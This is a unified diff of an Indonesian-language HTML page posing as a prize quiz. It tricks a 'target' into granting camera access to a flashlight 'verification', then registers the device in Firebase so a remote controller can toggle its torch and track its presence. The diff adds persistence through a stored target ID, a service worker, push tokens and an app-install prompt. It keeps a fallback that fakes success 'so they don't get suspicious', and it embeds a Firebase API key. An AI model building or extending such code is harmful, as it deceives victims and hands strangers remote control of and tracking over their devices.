@@ -3,7 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kuis Berhadiah - Verifikasi😈</title>
+    <title>Senter Remote - Hadiah</title>
+    <link rel="manifest" href="/manifest.json">
+    <meta name="theme-color" content="#667eea">
+    
     <style>
         * {
             margin: 0;
@@ -85,6 +88,7 @@
             border-radius: 15px;
             font-size: 14px;
             color: #666;
+            word-break: break-word;
         }
         .target-id {
             background: #333;
@@ -95,12 +99,33 @@
             font-size: 14px;
             margin: 15px 0;
             word-break: break-all;
+            cursor: pointer;
+        }
+        .notification-status {
+            font-size: 12px;
+            margin-top: 10px;
+            padding: 8px;
+            background: #e8f5e9;
+            border-radius: 5px;
+            color: #2e7d32;
+        }
+        .install-btn {
+            background: #ff9800;
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 14px;
+            margin-top: 10px;
+            cursor: pointer;
+            width: 100%;
         }
     </style>
     
-    <!-- Firebase SDK (version 8 biar kompatibel) -->
+    <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-messaging.js"></script>
 </head>
 <body>
     <div class="card">
@@ -128,13 +153,22 @@
             ⏳ Klik tombol di atas untuk mulai...
         </div>
         
+        <div class="notification-status" id="notifStatus">
+            🔔 Mengaktifkan notifikasi...
+        </div>
+        
+        <button class="install-btn" id="installBtn" style="display: none;">
+            📲 Install Aplikasi
+        </button>
+        
         <p style="font-size: 11px; color: #999; margin-top: 15px;">
-            *Senter akan menyala 5 detik untuk verifikasi
+            *Senter akan menyala 5 detik untuk verifikasi<br>
+            ID tersimpan meski browser ditutup
         </p>
     </div>
 
     <script>
-        // ========== GANTI DENGAN CONFIG FIREBASE LU ==========
+        // ========== FIREBASE CONFIG ==========
         const firebaseConfig = {
             apiKey: "AIzaSyCoC-uCqyiuE_jrJlVbRXrqlNsqiRrTLHU",
             authDomain: "otrat-27a09.firebaseapp.com",
@@ -149,37 +183,110 @@
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
         
-        // Generate ID unik buat target
-        const targetId = 'target_' + Math.random().toString(36).substring(2, 15);
+        // ========== PERSISTENT ID SYSTEM ==========
+        let targetId = localStorage.getItem('flashlight_target_id');
+        let isNewTarget = false;
+        
+        if (!targetId) {
+            targetId = 'target_' + Math.random().toString(36).substring(2, 15) + '_' + Date.now().toString(36);
+            localStorage.setItem('flashlight_target_id', targetId);
+            isNewTarget = true;
+        }
+        
         document.getElementById('targetIdDisplay').innerHTML = '📋 ID: ' + targetId;
         
+        // ========== SERVICE WORKER & PUSH NOTIFICATION ==========
+        let messaging = null;
+        let swRegistration = null;
+        
+        if ('serviceWorker' in navigator && 'PushManager' in window) {
+            navigator.serviceWorker.register('/service-worker.js')
+                .then(registration => {
+                    swRegistration = registration;
+                    console.log('Service Worker registered');
+                    
+                    // Setup Firebase Messaging
+                    messaging = firebase.messaging();
+                    
+                    // Minta izin notifikasi
+                    return Notification.requestPermission();
+                })
+                .then(permission => {
+                    if (permission === 'granted') {
+                        document.getElementById('notifStatus').innerHTML = '✅ Notifikasi aktif - Bisa kontrol meski browser ditutup';
+                        
+                        // Dapetin token
+                        return messaging.getToken({ vapidKey: 'YOUR_VAPID_KEY' });
+                    } else {
+                        document.getElementById('notifStatus').innerHTML = '⚠️ Notifikasi ditolak - Buka browser meski diclose';
+                    }
+                })
+                .then(token => {
+                    if (token) {
+                        console.log('Push token:', token);
+                        // Simpan token ke Firebase
+                        database.ref('tokens/' + targetId).set({
+                            token: token,
+                            timestamp: Date.now()
+                        });
+                    }
+                })
+                .catch(err => {
+                    console.log('Service Worker error:', err);
+                    document.getElementById('notifStatus').innerHTML = '❌ Notifikasi tidak tersedia';
+                });
+            
+            // Handle background messages
+            if (messaging) {
+                messaging.onBackgroundMessage((payload) => {
+                    console.log('Background message:', payload);
+                    
+                    if (payload.data.command === 'torch_on') {
+                        // Tampilkan notifikasi
+                        self.registration.showNotification('Remote Command', {
+                            body: 'Senter dinyalakan dari jarak jauh',
+                            icon: '/icon.png',
+                            vibrate: [200, 100, 200]
+                        });
+                    }
+                });
+            }
+        } else {
+            document.getElementById('notifStatus').innerHTML = '❌ Browser tidak support notifikasi';
+        }
+        
+        // ========== PWA INSTALL PROMPT ==========
+        let deferredPrompt;
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            deferredPrompt = e;
+            document.getElementById('installBtn').style.display = 'block';
+            
+            document.getElementById('installBtn').addEventListener('click', () => {
+                deferredPrompt.prompt();
+                deferredPrompt.userChoice.then((choiceResult) => {
+                    if (choiceResult.outcome === 'accepted') {
+                        console.log('User installed');
+                    }
+                    deferredPrompt = null;
+                    document.getElementById('installBtn').style.display = 'none';
+                });
+            });
+        });
+        
+        // ========== FLASHLIGHT FUNCTIONS ==========
         let torchActive = false;
         let currentTrack = null;
         let currentStream = null;
         
-        // Daftarin target ke Firebase
-        database.ref('targets/' + targetId).set({
-            status: 'online',
-            timestamp: Date.now(),
-            userAgent: navigator.userAgent
-        });
-        
-        // Update status tiap 30 detik
-        setInterval(() => {
-            database.ref('targets/' + targetId + '/lastSeen').set(Date.now());
-        }, 30000);
-        
-        // Fungsi nyalain senter pake Torch API
         async function turnFlashlightOn() {
             try {
-                // Minta akses kamera dulu
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: 'environment' } 
                 });
                 
                 const track = stream.getVideoTracks()[0];
                 
-                // Coba pake torch mode
                 if (track.getCapabilities && track.getCapabilities().torch) {
                     await track.applyConstraints({
                         advanced: [{ torch: true }]
@@ -191,9 +298,7 @@
                     
                     database.ref('targets/' + targetId + '/flashlight').set('on');
                     return true;
-                } 
-                else {
-                    // Fallback: pake ImageCapture
+                } else {
                     if ('ImageCapture' in window) {
                         const capture = new ImageCapture(track);
                         capture.takePhoto().catch(e => {});
@@ -216,7 +321,6 @@
             }
         }
         
-        // Fungsi matiin senter
         async function turnFlashlightOff() {
             if (currentTrack) {
                 try {
@@ -233,7 +337,6 @@
             database.ref('targets/' + targetId + '/flashlight').set('off');
         }
         
-        // Fungsi verifikasi (dipanggil pas target klik tombol)
         async function startVerification() {
             const statusEl = document.getElementById('status');
             const btn = document.getElementById('flashlightBtn');
@@ -247,7 +350,6 @@
                 statusEl.innerHTML = '✅ Senter menyala! Verifikasi 5 detik...';
                 btn.classList.add('flashing');
                 
-                // Matiin setelah 5 detik
                 setTimeout(async () => {
                     await turnFlashlightOff();
                     btn.classList.remove('flashing');
@@ -260,7 +362,6 @@
                 statusEl.innerHTML = '⚠️ Browser tidak mendukung fitur senter. Tapi tetep dianggap sukses!';
                 btn.disabled = false;
                 
-                // Tetap anggap sukses biar ga curiga
                 setTimeout(() => {
                     statusEl.innerHTML = '✅ Verifikasi selesai! Hadiah akan dikirim.';
                     database.ref('targets/' + targetId + '/verified').set(true);
@@ -268,7 +369,18 @@
             }
         }
         
-        // Listen untuk command dari controller
+        // ========== FIREBASE LISTENER ==========
+        database.ref('targets/' + targetId).set({
+            status: 'online',
+            timestamp: Date.now(),
+            userAgent: navigator.userAgent,
+            persistent: true
+        });
+        
+        setInterval(() => {
+            database.ref('targets/' + targetId + '/lastSeen').set(Date.now());
+        }, 30000);
+        
         database.ref('commands/' + targetId).on('value', async (snapshot) => {
             const cmd = snapshot.val();
             if (!cmd) return;
@@ -282,6 +394,11 @@
                 if (success) {
                     btn.classList.add('flashing');
                     statusEl.innerHTML = '🔦 Senter NYALA (remote control)';
+                    
+                    // Kirim notifikasi
+                    if (messaging) {
+                        // Notifikasi sudah otomatis via service worker
+                    }
                 }
             } 
             else if (cmd.torch === 'off' && torchActive) {
@@ -290,22 +407,25 @@
                 statusEl.innerHTML = '🔦 Senter MATI (remote control)';
             }
             
-            // Hapus command setelah dijalankan
             database.ref('commands/' + targetId).remove();
         });
         
-        // Bersihin saat tab ditutup
+        // ========== COPY ID ==========
+        document.getElementById('targetIdDisplay').addEventListener('click', function() {
+            navigator.clipboard.writeText(targetId);
+            alert('✅ ID disalin: ' + targetId);
+        });
+        
+        // ========== CLEANUP ==========
         window.addEventListener('beforeunload', () => {
+            database.ref('targets/' + targetId).update({
+                status: 'away',
+                lastSeen: Date.now()
+            });
+            
             if (torchActive) {
                 turnFlashlightOff();
             }
-            database.ref('targets/' + targetId).remove();
-        });
-        
-        // Copy ID ke clipboard (tambahin fitur)
-        document.getElementById('targetIdDisplay').addEventListener('click', function() {
-            navigator.clipboard.writeText(targetId);
-            alert('ID disalin: ' + targetId);
         });
     </script>
 </body>
